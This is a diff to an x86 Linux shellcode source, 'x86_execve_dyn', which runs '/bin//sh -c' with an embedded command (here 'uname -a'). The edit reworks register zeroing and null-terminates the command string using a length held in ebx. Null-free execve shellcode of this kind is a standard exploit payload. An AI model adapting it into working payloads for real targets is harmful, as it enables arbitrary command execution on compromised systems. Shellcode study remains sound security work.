@@ -37,7 +37,7 @@
 
 ;   x86_execve_dyn
 ;
-;   * 43 bytes (without dynamic command)
+;   * 47 bytes (without dynamic command)
 ;   * null-free
 ;
 ;
@@ -52,18 +52,20 @@ global _start
 section .text
 
 _start:
-	push 11             ; execve() syscall
-	pop eax
-	cdq                 ; envp[] = edx = NULL
-	
+	xor ebx, ebx
+	mul ebx             ; zero ebx, eax and edx; envp[] = edx = NULL
+	mov al, 11          ; execve() syscall
+
 	push edx            ; NULL pointer
 	push word 0x632d    ; "-c"
 	mov edi, esp        ; edi = pointer to "-c\0" string
 	jmp getpc
 code:
 	pop esi             ; esi = pointer to dynamic command string
-	mov [esi+slen], edx ; put '\0' at the end of the command string
-	
+	mov byte bl, cmdlen ; put cmd length (displacement) into ebx
+	; mov word bx, 0x0101
+	mov [esi+ebx], dl   ; put '\0' at the end of the command string
+
 	push edx            ; NULL pointer
 	push 0x68732f2f     ; "//sh"
 	push 0x6e69622f	    ; "/bin"
@@ -84,4 +86,4 @@ getpc:
 	call code            ; return to code saving pc (dynamic cmd pointer) into the stack
 string:
 	db "uname -a"
-slen    equ $ - string
+cmdlen  equ $ - string
